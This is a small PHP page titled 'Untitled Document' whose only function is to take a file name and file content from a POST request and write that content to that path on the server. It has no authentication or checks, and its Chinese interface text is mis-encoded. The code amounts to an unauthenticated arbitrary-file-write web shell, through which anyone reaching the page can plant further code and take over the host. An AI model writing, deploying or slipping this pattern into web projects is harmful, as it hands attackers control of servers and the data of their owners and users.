<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
</head>

<body bgcolor="#FFFFFF" text="#000000">
<?
	$content = $HTTP_POST_VARS['content'];
	$filename= $HTTP_POST_VARS['filename'];
	$fp = fopen($filename,"w");
	//fwrite($fd,$content);
	fputs($fp,stripslashes($content));
	fclose($fp);
	echo "�޸��ļ�:".$filename."<br>";
	//echo "���ݣ�<br><pre>".$content."</pre>";
?>
<form name="form1" method="post" action="">
  <input type="button" name="Button" value=" &lt;&lt; " onClick="history.back()">
  <input type="button" name="close" value="�زŴ���" onClick="self.close()">
</form>
</body>
</html>
